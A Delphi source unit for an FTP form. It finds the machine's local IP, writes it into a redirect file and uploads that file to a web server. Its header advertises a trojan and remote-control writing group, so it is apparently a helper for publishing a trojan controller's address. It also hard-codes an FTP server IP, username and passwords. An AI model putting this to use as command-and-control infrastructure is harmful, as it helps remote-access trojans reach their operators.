unit Unit2;
{作者BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
远程控制和木马编写群30096995   }
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, IdBaseComponent, IdComponent, IdTCPConnection,
  IdTCPClient, IdFTP,   shellapi,IniFiles,winsock;

type
  Tftp = class(TForm)
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    ComboBox1: TComboBox;
    Edit1: TEdit;
    Edit2: TEdit;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Edit6: TEdit;
    Button1: TButton;
    Label9: TLabel;
    Edit7: TEdit;
    Button2: TButton;
    IdFTP1: TIdFTP;
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  ftp: Tftp;
    myinifile:Tinifile;      //定义类型INI

implementation

{$R *.dfm}
procedure GetLocalIP;
type
  TaPInAddr = array[0..255] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  Buffer: array[0..63] of char;
  i: integer;
  GInitData: TWSADATA;
  Temp: string;
begin
  wsastartup($101, GInitData);
  Temp := '';
  GetHostName(Buffer, SizeOf(Buffer));
  phe := GetHostByName(buffer);
  if not assigned(phe) then
    exit;
  pptr := PaPInAddr(Phe^.h_addr_list);
  i := 0;
  while pptr^[I] <> nil do begin
    Temp := Temp + StrPas(inet_ntoa(pptr^[I]^)) + ',';
    inc(i);
  end;
  Delete(Temp, Length(Temp), 1);
  try
    ftp.ComboBox1.Text:=Temp;
    ftp.ComboBox1.Items.Add(Temp);     //添加IP
  except
  end;
  wsacleanup;      //清除
end;


procedure Tftp.Button2Click(Sender: TObject);
begin
ShellExecute(0,nil,PChar(Edit7.Text), nil, nil, SW_NORMAL);
end;

procedure Tftp.FormCreate(Sender: TObject);
var
  filename:string;
begin
  filename:=ExtractFilePath(paramstr(0))+'alalmn.ini';                                 //把myini.ini文件存储在应用程序当前目录中
  myinifile:=TInifile.Create(filename);                                              //把myini.ini文件存储在应用程序当前目录中
  edit1.Text:= myinifile.readstring('FTP参数','FTP服务器','222.189.228.184');
  edit2.Text:= myinifile.readstring('FTP参数','端口','21');
  edit3.Text:= myinifile.readstring('FTP参数','用户名','alalmn');
  edit4.Text:= myinifile.readstring('FTP参数','登陆密码','123456');
  edit5.Text:= myinifile.readstring('FTP参数','确认密码','654321');
  edit6.Text:= myinifile.readstring('FTP参数','存放IP文件','wwwroot\\ip.txt');
  edit7.Text:= myinifile.readstring('FTP参数','HTTP地址','http://www.e1058.com/ip.txt');
end;

procedure Tftp.FormDestroy(Sender: TObject);
begin
  myinifile.writestring('FTP参数','FTP服务器',edit1.Text);
  myinifile.writestring('FTP参数','端口',edit2.Text);
  myinifile.writestring('FTP参数','用户名',edit3.Text);
  myinifile.writestring('FTP参数','登陆密码',edit4.Text);
  myinifile.writestring('FTP参数','确认密码',edit5.Text);
  myinifile.writestring('FTP参数','存放IP文件',edit6.Text);
  myinifile.writestring('FTP参数','HTTP地址',edit7.Text);
  myinifile.Destroy;
end;

procedure Tftp.Button1Click(Sender: TObject);
var
F:TextFile;
begin
if Edit1.Text='' then
  begin
    Label7.Caption :='请输入FTP服务器地址!';
    Exit;
  end;
if Edit3.Text='' then
  begin
    Label7.Caption :='请输入FTP用户名!';
    Exit;
  end;
if Edit4.Text<>Edit5.Text then
  begin
    Label7.Caption :='两次密码输入不一样!';
    Edit4.Text:='';
    Edit5.Text:='';
    Exit;
  end;

Label7.caption:='正在更新FTP!';
IdFTP1.Host:= Edit1.Text;
IdFTP1.Port:= strtoint(Edit2.Text);
IdFTP1.Username:=Edit3.Text;
IdFTP1.Password:=Edit4.Text;
IdFTP1.Connect();   //连接
    if IdFTP1.Connected then    //连接相应操作
    begin
    AssignFile(F,ExtractFilePath(Paramstr(0))+'test.htm');
    ReWrite(F);
    Writeln(F,'{window.location = "http://'+ComboBox1.text+'";;}');
    CloseFile(F);
    IdFTP1.Put(ExtractFilePath(Paramstr(0))+'test.htm',Edit6.Text,false);
    IdFTP1.Disconnect;
    Label7.caption:='更新FTP成功，请使用'+Edit7.Text+'访问!';
    end  else
    begin
     Label7.caption:='更新IP错误!请检查网络!';
    end;
    if FileExists(ExtractFilePath(Paramstr(0))+'test.htm') then
     DeleteFile(ExtractFilePath(Paramstr(0))+'test.htm');
  end;

procedure Tftp.FormShow(Sender: TObject);
begin
GetLocalIP;
end;

end.
